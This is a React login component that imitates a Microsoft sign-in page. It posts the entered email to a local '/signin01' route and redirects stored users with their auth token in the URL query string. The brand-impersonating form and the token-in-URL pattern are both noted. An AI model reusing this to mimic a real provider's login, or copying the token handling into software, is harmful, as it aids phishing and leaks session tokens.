import React, { useEffect, useState } from "react";
import "../../styles/login.css";
import logo from "../../images/navbar/navbar_icon.png";
import axios from "axios";
import { Redirect, Link } from "react-router-dom";

function Login01() {
    let [email, setEmail] = useState({});
    const handleSubmit = () => {
        axios
            .post("/signin01", email)
            .then(() => {
                console.log("Submitted Successfully");
            })
            .catch((err) => {
                console.log(err.message);
            });
    };

    const token = localStorage.getItem("token");

    return (
        <div>
            {token ? (
                <Redirect to={`/user?token=${token}`} />
            ) : (
                <div className="login">
                    <div className="login-main">
                        <img src={logo} alt="Microsoft" />
                        <h2>Sign in</h2>
                        <form
                            method="POST"
                            onSubmit={() => handleSubmit()}
                            id="login01"
                            className="login-main-email"
                        >
                            <input
                                placeholder="Email"
                                name="email"
                                onChange={(e) => {
                                    setEmail(e.target.value);
                                }}
                            />
                        </form>
                        <Link to="/signup01" style={{ textDecoration: "none" }}>
                            <p>
                                No account? <span>Create One!</span>
                            </p>
                        </Link>
                        <div className="login-main-button">
                            <button form="login01" type="submit">
                                Next
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default Login01;
